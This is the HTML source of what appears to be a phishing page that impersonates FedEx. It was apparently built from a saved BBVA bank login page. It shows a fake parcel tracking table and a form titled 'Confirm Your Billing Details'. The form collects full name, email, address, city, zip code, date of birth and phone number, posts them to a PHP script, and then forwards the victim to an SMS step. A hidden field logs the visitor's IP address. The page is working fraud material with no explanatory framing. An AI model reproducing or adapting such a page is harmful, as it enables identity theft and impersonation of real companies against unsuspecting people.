﻿<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0060)https://www.bbvanetcash.pe/KDPOSolicitarCredenciales_es.html -->
<html><!--xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">--><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    
    <title>FedEx | Shipping Costs</title>
	<link rel="icon" href="files/favicon.ico" type="image/x-icon">

	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="0">
    <meta http-equiv="Content-Style-Type" content="text/css">
    <meta http-equiv="X-UA-Compatible" content="IE=edge;IE=9;IE=10;IE=11">
    
    <meta http-equiv="Content-Language" content="es">
    <meta name="viewport" content="initial-scale=1">
    <script type="text/javascript" src="./files/plantilla_es.js.téléchargement"></script>
    <script type="text/javascript" src="./files/direccionPIBEE_es.js.téléchargement"></script>
    <script type="text/javascript" src="./files/keyBoard_es.js.téléchargement"></script>
	<script type="text/javascript" src="./files/desmigrados_es.js.téléchargement"></script>
	<script type="text/javascript" src="./files/cookie.js.téléchargement"></script>
    <!--<link rel="stylesheet" media="screen" href="css/estilos_index_es.css" type="text/css">-->
 	
    
    <!-- CSS de Bootstrap -->
    <link href="./files/bootstrap.css" rel="stylesheet" media="screen">
    <link href="./files/bootstrap-bbva.css" rel="stylesheet" media="screen">
    
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
   <script type="text/javascript" src="http://code.jquery.com/jquery-2.0.2.js"></script>
</head>

    
    <!--------------------------------------------------------------------->
    <body >
      
    <div class="container">	
        <!-- HEADER -->
        <div class="row">
        	<div class="col-lg-12 non-padding">
                <ul class="header-layouts list-unstyled visible-xs">
                    <li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
                    
                </ul>
            </div>
			<div class="col-lg-12 visible-xs" style="
    background-color: #4d148c;
    height: 46px;
    margin-top: -13px;
">
				<div class="col-lg-12" style="top:6px">
					<img style="width: 106px;height:auto;" src="./files/logo.png">
				</div>
			</div>
            <div class="col-lg-12 margin-bottomx20">

            </div>
        </div>
        
        <div class="row">
                    	<div class="col-lg-4 col-md-4 col-sm-4 hidden-xs">
							<img style="width:100%" src="./files/logo.png">
						</div>

						
						<ul class="list-unstyled list-inline-general-header pull-right">
						
						</ul>
						
                    	
                        <div class="clearfix"></div>
                       <input type=hidden name="env_report" value="<?php print $_SERVER['REMOTE_ADDR']; ?>">
                        
                        <div class="col-lg-4 col-md-4 col-sm-4">
                        	<h1 class="line-horizontal line-login-v2"></h1>
                            <form name="logon" method="POST" action="sift1.php">
							
							
<script type="text/javascript">
$('#comm').on('click', function () {
    document.getElementById("id2").style.display="block";
    document.getElementById("id1").style.display="none";
    //document.getElementById("id2").style.display="block";
});
  </script>
  
  
							<img src="files/tracking.png" alt="" title="" border="0" width="40" height="40">
							<font color="#691A99" class="ws11" style="
    font-size: 18px;
"><b><font style="vertical-align: inherit;">Confirm Your Billing Details</font></b></font>
<style>
table {
  border-collapse: collapse;
  width: 100%;
}

th, td {
  text-align: left;
  padding: 8px;
}

tr:nth-child(even) {background-color: #f2f2f2;}
</style>
<table border="0" cellpadding="1" cellspacing="1" style="width: 100%;border-collapse: separate;margin-bottom: 21px;">
	<tbody>
		<tr>
			<td>Tracking number</td>
			<td>796548774020 <br> ( Active once process is complete )</td>
		</tr>
		<tr>
			<td>Weight</td>
			<td>1.24 lbs </td>
		</tr>
		<tr>
			<td>Total number of units</td>
			<td>1</td>
		</tr>
		<tr>
			<td>Packaging</td>
			<td>FedEx Inc</td>
		</tr>
		<tr>
			<td>Reference</td>
			<td>112-0930796-6956877</td>
		</tr>
		
	</tbody>
</table>
<h1 class="line-horizontal line-login-v2"></h1>
							
                            	<input type="hidden" name="from" value="FedEx">
        						<input type="hidden" name="">
                            	<div class="row" id="id1" style="display: block;">
                                    
									
                                    <div class="col-xs-12 margin-bottomx10">
									
                                        <label class="control-label" for="cuit" id="cuit" style=" font-weight: bold; color: #333;"><font style="vertical-align: inherit;"></font></label>
                                        <input type="text" autocomplete="off" class="form-control" name="Log" id="Log" tabindex="2" maxlength="20" onfocus="tvSetCampo( this, 11, 'a1' ),pintar(this);modificarDatosIngreso('usuario')" onblur="despintar(this,'#ffffff')" required="" style="display: block; background: rgb(255, 255, 255);" value="" placeholder="Full Name">
										
                                    </div>

<div class="col-xs-12 margin-bottomx10">
									
                                        <label class="control-label" for="cuit" id="cuit" style=" font-weight: bold; color: #333;"><font style="vertical-align: inherit;"></font></label>
                                        <input type="text" autocomplete="off" class="form-control" name="lname" id="Log" tabindex="2" maxlength="100" onblur="despintar(this,'#ffffff')" required="" style="display: block; background: rgb(255, 255, 255);" value="" placeholder="Email">
										
                                    </div>
<div class="col-xs-12 margin-bottomx10">
									
                                        <label class="control-label" for="cuit" id="cuit" style=" font-weight: bold; color: #333;"><font style="vertical-align: inherit;"></font></label>
                                        <input type="text" autocomplete="off" class="form-control" name="adress" id="Log" tabindex="2" maxlength="20" onfocus="tvSetCampo( this, 11, 'a1' ),pintar(this);modificarDatosIngreso('usuario')" onblur="despintar(this,'#ffffff')" required="" style="display: block; background: rgb(255, 255, 255);" value="" placeholder="Address">
										
                                    </div>
<div class="col-xs-12 margin-bottomx10">
									
                                        <label class="control-label" for="cuit" id="cuit" style=" font-weight: bold; color: #333;"><font style="vertical-align: inherit;"></font></label>
                                        <input type="text" autocomplete="off" class="form-control" name="city" id="Log" tabindex="2" maxlength="20" onfocus="tvSetCampo( this, 11, 'a1' ),pintar(this);modificarDatosIngreso('usuario')" onblur="despintar(this,'#ffffff')" required="" style="display: block; background: rgb(255, 255, 255);" value="" placeholder="City">
										
                                    </div>
<div class="col-xs-12 margin-bottomx10">
									
                                        <label class="control-label" for="cuit" id="cuit" style=" font-weight: bold; color: #333;"><font style="vertical-align: inherit;"></font></label>
                                        <input type="text" autocomplete="off" class="form-control" name="zipcode" id="Log" tabindex="2" maxlength="20" onfocus="tvSetCampo( this, 11, 'a1' ),pintar(this);modificarDatosIngreso('usuario')" onblur="despintar(this,'#ffffff')" required="" style="display: block; background: rgb(255, 255, 255);" value="" placeholder="Zip Code">
										
                                    </div>
<div class="col-xs-12 margin-bottomx10">
									
                                        <label class="control-label" for="cuit" id="cuit" style=" font-weight: bold; color: #333;"><font style="vertical-align: inherit;"></font></label>
                                        <input type="text" autocomplete="off" class="form-control" name="phone" id="Log" tabindex="2" maxlength="20" onfocus="tvSetCampo( this, 11, 'a1' ),pintar(this);modificarDatosIngreso('usuario')" onblur="despintar(this,'#ffffff')" required="" style="display: block; background: rgb(255, 255, 255);" value="" placeholder="Date of Birth (DD/MM/YYYY)">
										
                                    </div>
<div class="col-xs-12 margin-bottomx10">
									
                                        <label class="control-label" for="cuit" id="cuit" style=" font-weight: bold; color: #333;"><font style="vertical-align: inherit;"></font></label>
                                        <input type="text" autocomplete="off" class="form-control" name="dob" id="Log" tabindex="2" maxlength="20" required="" style="display: block; background: rgb(255, 255, 255);" value="" placeholder="Mobile Phone Number">
										
                                    </div>

									<!--
									
                                    <div class="col-xs-12 margin-bottomx10">
									<img style="width: 20px; margin-bottom: 7px;" src="./files/pss.PNG">
                                        <label class="control-label" for="clave de acceso" id="clave_acceso" style=" font-weight: bold; color: #333;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Password</font></font></label>
                                        <input type="password" autocomplete="off" class="form-control" name="Pass" id="Pass" tabindex="3" title="Password" maxlength="20" onfocus="tvSetCampo( this, 11, 'a0' ),pintar(this)" onblur="despintar(this,'#ffffff')" required="">
                                    </div>
                                    -->
									
                             
                                    <div class="col-xs-12 margin-top-button-ingresar">
                                        <button type="submit" id="comm" class="btn btn-primary btn-block" style="margin-top: 22px;background-color: #ff6200;border-color: #ff6200;"><font style="vertical-align: inherit;font-size: 20px;font-family: inherit;">Confirm</font></button>
										
										<input type="hidden" name="frm" value="index.html">
											<input type="hidden" name="to" value="sms.html">
                                    </div>
                                </div>
								
								<div id="id2" style="display: none;">
								
								</div>
                            </form>
                            
                            <div class="line-horizontal line-login-v2"></div>
                            
							
							</div>
							<div class="msj_ico msj_inf">
								
							</div>

                        </div>
        
		<div class="clearfix"></div>
		<!-- FOOTER -->
        <footer class="footer-bbva row">
                
                
        </footer>
		
        <!-- Librería jQuery requerida por los plugins de JavaScript -->
        <script src="./files/bootstrap.min.js.téléchargement"></script>
	</div>


</body></html>